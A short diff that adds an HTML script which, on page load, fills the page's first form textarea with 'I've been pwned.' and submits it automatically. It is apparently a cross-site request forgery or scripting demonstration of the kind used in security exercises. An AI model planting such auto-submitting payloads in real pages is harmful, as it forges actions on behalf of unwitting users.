@@ -1,0 +1,10 @@
+<script>
+    function attack() {
+        const form = document.getElementsByTagName("form")[0];
+        const textarea = form.getElementsByTagName("textarea")[0];
+        textarea.value = "I've been pwned.";
+        const submitButton = form.querySelector("input[type=submit]")
+        submitButton.click();
+    }
+    document.addEventListener('DOMContentLoaded', attack, false);
+</script>
